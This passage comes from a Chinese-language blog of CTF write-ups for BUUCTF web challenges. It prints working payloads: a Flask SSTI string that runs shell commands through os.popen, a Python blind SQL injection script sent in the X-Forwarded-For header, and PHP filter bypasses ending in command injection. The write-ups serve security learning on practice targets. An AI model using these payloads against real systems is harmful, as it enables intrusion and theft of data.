punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'decrypt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$decr</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'decrypt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">include</span> <span class="token string">'flag_2sln2ndln2klnlksnf.php'</span><span class="token punctuation">;</span>        <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$decr</span> <span class="token operator">===</span> <span class="token variable">$cipher</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token constant">WHAT_YOU_WANT</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'爬'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Refresh:0.1;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//I heard you can break PHP mt_rand seed</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>虽然看到mt_srand很亲切，但很遗憾这次是真随机数。</p><p>得到flag的条件</p><pre class=" language-php"><code class="language-php">    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$decr</span> <span class="token operator">===</span> <span class="token variable">$cipher</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">WHAT_YOU_WANT</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>这里有一个点，关于session绕过。</p><p>当删去cookie中的SESSIONID，相应的SESION文件也无法被找到。这时SESSION值为NULL。</p><p>这里的 $_SESSION[‘secret’]本来是真随机数，但当我们删掉sessionid时，值被转化成NULL。</p><p>也就变成了</p><pre class=" language-php"><code class="language-php">    <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$cipher可知了。为：kD5ilwX8ZTfhTBAfaGiuVA==</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220172718967.png" srcset="/img/loading.gif" alt="image-20201220172718967"></p><p>删掉sessionid,传入cipher得到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220172855482.png" srcset="/img/loading.gif" alt="image-20201220172855482"></p><p>可能会想不到记录一下：看别人wp说由于base64编码$cipher值里可能会存在有+的情况，会被识别成空格。url转一下就可以了。</p><h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><p><strong>考点：ssti</strong></p><p>名就告诉是flask。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220174556976.png" srcset="/img/loading.gif" alt="image-20201220174556976"></p><p>功能是一个搜索界面。查看源码，看见参数search。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220173812323.png" srcset="/img/loading.gif" alt="image-20201220173812323"></p><p>简单测试，存在ssti。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220174618494.png" srcset="/img/loading.gif" alt="image-20201220174618494"></p><p>存了几个payload试试</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></pre><p>直接返回500。怀疑是有过滤。试了几个，globals被过滤。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220180619682.png" srcset="/img/loading.gif" alt="image-20201220180619682"></p><p>拼接绕一下</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;ls&#39;).read()</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220180722363.png" srcset="/img/loading.gif" alt="image-20201220180722363"></p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read()&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;).read()</code></pre><p>得到flag</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220181317512.png" srcset="/img/loading.gif" alt="image-20201220181317512"></p><h1 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h1><p><strong>考点：xff注入</strong></p><p>这个收集信息说的怪怪的。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220183310829.png" srcset="/img/loading.gif" alt="image-20201220183310829"></p><p>看一眼源码。原来是记录了ip。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220183351879.png" srcset="/img/loading.gif" alt="image-20201220183351879"></p><p>一开始url参传了下127.0.0.1,发现也会被记录。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220183831254.png" srcset="/img/loading.gif" alt="image-20201220183831254"></p><p>那再试下加个xff头，多了个last ip。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220184642401.png" srcset="/img/loading.gif" alt="image-20201220184642401"></p><p>如果再改个新的Ip。ip再次被更新了。</p><p>这里就怀疑ip被存进数据库了。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220184717711.png" srcset="/img/loading.gif" alt="image-20201220184717711"></p><p>如果xff内的ip，比如sql，它第一次被输入会作为current ip，当输入一个不同的ip比如123，current成为123，而last变成sql。这时候sql被存入数据库，但并不会被执行。然而当我们第二次输入123时，因为和currect相同，lastip就会直接从数据库里查找，那sql也就被执行了。</p><p>猜测插入语句是</p><pre><code>INSERT INTO table_name (current-ip,last-ip ) VALUES (&#39;current-ip&#39;,&#39;last-ip&#39; );</code></pre><p>那么构造payload测试</p><pre><code>1’or&#39;1</code></pre><p>存完1’or’1，再存一个233。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220193759964.png" srcset="/img/loading.gif" alt="image-20201220193759964"></p><p>再次输入，可以看到last变成1了，确实存在注入点。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220193829996.png" srcset="/img/loading.gif" alt="image-20201220193829996"></p><p>（这里感觉我思路还是很乱的，之后看其他人的wp，下面这个思路就顺理成章）<img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220192558980.png" srcset="/img/loading.gif" alt="image-20201220192558980"></p><p>恶就恶心在它flag不在当前数据库中，哈哈^  ^。</p><p>直接盲注中间就不细写了。exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://node3.buuoj.cn:29831/"</span>head <span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span> <span class="token punctuation">:</span> <span class="token string">"track_uuid=50983484-80d0-4c5a-fd92-8ddbc2912e95"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#payload1 = "0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{},1))>{} or '0"</span><span class="token comment" spellcheck="true">#payload2 = "0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),{},1))>{} or '0"</span><span class="token comment" spellcheck="true">#payload3 = "0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),{},1))>{} or '0"</span>payload <span class="token operator">=</span> <span class="token string">"0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),{},1))>{} or '0"</span>flag <span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low <span class="token operator">=</span> <span class="token number">32</span>    high <span class="token operator">=</span><span class="token number">137</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span><span class="token punctuation">:</span>        payload1 <span class="token operator">=</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        head<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload1        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>        head<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"233"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Last Ip: 1 "</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mid <span class="token operator">==</span><span class="token number">32</span> <span class="token operator">or</span> mid <span class="token operator">==</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    flag <span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220203552386.png" srcset="/img/loading.gif" alt="image-20201220203552386"></p><h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p><strong>考点：代码审计</strong></p><p>看源码，看来是第一层</p><pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment" spellcheck="true">//1st</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string">'%5f'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Y0u are So cutE!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b_u_p_t'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'23333'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^23333$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b_u_p_t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"you are going to the next ~"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">></span></code></pre><p>还是传参的.会变成_的技巧</p><p>payload</p><pre><code>?b.u.p.t=23333%0a</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220223452710.png" srcset="/img/loading.gif" alt="image-20201220223452710"></p><p>访问一下，再查看源码，一堆jsfuck编码，控制台解一下、</p><p>要post Merak.</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220223803729.png" srcset="/img/loading.gif" alt="image-20201220223803729"></p><p>POST完给了源码。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string">'takeip.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Merak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token function">ord</span> <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'Local access only!'</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token string">"Sorry,you don't have permission!  Your ip is :"</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'2333'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'todat is a happy day'</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"Your REQUEST is:"</span><span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter">?></span>  </code></pre><p>这就没什么了，直接构造payload</p><pre><code>?2333=data:text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=//加个头client-ip: 127.0.0.1</code></pre><p>得到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220230012870.png" srcset="/img/loading.gif" alt="image-20201220230012870"></p><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p><strong>考点：intval漏洞，php弱类型</strong></p><p>找了一圈，没什么有效信息。</p><p>扫一下</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221102817179.png" srcset="/img/loading.gif" alt="image-20201221102817179"></p><p>访问robots.txt，假的</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221102908278.png" srcset="/img/loading.gif" alt="image-20201221102908278"></p><p>那直接看fl4g.php（本来应该是去fakeflag那个网页的头里找，这直接扫出来了</p><p>给了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//level 1 </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token markup">&lt; 2020 &amp;&amp; intval($num + 1) ></span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//level 2 </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//get flag </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre><p>先看level1的intval,既要求num小于2020，又要求num+1大于2020。</p><p>intval有会返回第一次出现非数字符前面的整数的这个漏洞，从这里入手。用科学计数法绕过。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">"1e4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">"1e4"</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// +1后字符串型的科学计数法被强制转换为数字</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token function">int</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">)</span></code></pre><p>再看level2，要求$md5==md5($md5)，弱类型那就随便上网找一个，0e215962017（懒了，写脚本跑跑也行。</p><p>再看level3,这直接能执行命令了，先ls。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221111305842.png" srcset="/img/loading.gif" alt="image-20201221111305842"></p><p>cat过滤了，用nl;空格过滤了，用$IFS$9。</p><p>最终payload</p><pre><code>?num=1e4&amp;md5=0e215962017&amp;get_flag=nl$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221111717347.png" srcset="/img/loading.gif" alt="image-20201221111717347"></p>]]></content>
    
    
    <categories>
      
      <category>ctfweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>insert into</title>
    <link href="/2019/08/24/insert%20into/"/>
    <url>/2019/08/24/insert%20into/</url>
    
